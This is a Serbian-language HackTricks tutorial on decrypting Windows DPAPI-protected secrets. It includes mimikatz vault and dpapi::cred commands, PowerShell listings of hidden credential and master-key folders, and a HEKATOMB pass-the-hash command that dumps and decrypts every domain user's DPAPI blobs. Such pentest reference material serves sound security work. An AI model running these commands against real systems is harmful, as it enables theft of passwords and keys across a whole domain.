# DPAPI - Ekstrakcija Lozinki

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

Data Protection API (DPAPI) se prvenstveno koristi unutar Windows operativnog sistema za **simetričnu enkripciju asimetričnih privatnih ključeva**, koristeći ili korisničke ili sistemske tajne kao značajan izvor entropije. Ovaj pristup pojednostavljuje enkripciju za programere omogućavajući im da enkriptuju podatke koristeći ključ izveden iz korisničkih logon tajni ili, za sistemsku enkripciju, tajne autentifikacije domena sistema, čime se eliminiše potreba da programeri sami upravljaju zaštitom enkripcijskog ključa.

### Zaštićeni Podaci od DPAPI

Među ličnim podacima zaštićenim od DPAPI su:

- Lozinke i podaci za automatsko popunjavanje Internet Explorer-a i Google Chrome-a
- Lozinke za e-mail i interne FTP naloge za aplikacije kao što su Outlook i Windows Mail
- Lozinke za deljene foldere, resurse, bežične mreže i Windows Vault, uključujući enkripcijske ključeve
- Lozinke za veze sa udaljenim desktop-om, .NET Passport, i privatne ključeve za razne svrhe enkripcije i autentifikacije
- Mrežne lozinke kojima upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger, i još mnogo toga

## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Credential Files

Zaštićene **datoteke sa kredencijalima** mogu se nalaziti u:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Dobijte informacije o kredencijalima koristeći mimikatz `dpapi::cred`, u odgovoru možete pronaći zanimljive informacije kao što su enkriptovani podaci i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Možete koristiti **mimikatz modul** `dpapi::cred` sa odgovarajućim `/masterkey` za dekripciju:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

DPAPI ključevi koji se koriste za enkripciju RSA ključeva korisnika čuvaju se u `%APPDATA%\Microsoft\Protect\{SID}` direktorijumu, gde je {SID} [**Identifikator bezbednosti**](https://en.wikipedia.org/wiki/Security_Identifier) **tog korisnika**. **DPAPI ključ se čuva u istoj datoteci kao i glavni ključ koji štiti privatne ključeve korisnika**. Obično je to 64 bajta nasumičnih podataka. (Primetite da je ovaj direktorijum zaštićen, tako da ga ne možete listati koristeći `dir` iz cmd, ali ga možete listati iz PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ovo je kako će izgledati skup Master Keys korisnika:

![](<../../images/image (1121).png>)

Obično **svaki master key je enkriptovani simetrični ključ koji može dekriptovati drugi sadržaj**. Stoga, **ekstrakcija** **enkriptovanog Master Key-a** je zanimljiva kako bi se **dekriptovao** kasnije taj **drugi sadržaj** enkriptovan njime.

### Ekstrakcija master key-a i dekripcija

Pogledajte post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) za primer kako da ekstraktujete master key i dekriptujete ga.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) je C# port nekih DPAPI funkcionalnosti iz [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) projekta.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje ekstrakciju svih korisnika i računara iz LDAP direktorijuma i ekstrakciju backup ključa kontrolera domena putem RPC-a. Skripta će zatim rešiti sve IP adrese računara i izvršiti smbclient na svim računarima kako bi prikupila sve DPAPI blob-ove svih korisnika i dekriptovala sve sa backup ključem domena.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Sa listom računara ekstrahovanih iz LDAP-a možete pronaći svaku podmrežu čak i ako ih niste znali!

"Jer prava Domain Admin-a nisu dovoljna. Hakujte ih sve."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski dumpovati tajne zaštićene DPAPI-jem.

## Reference

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
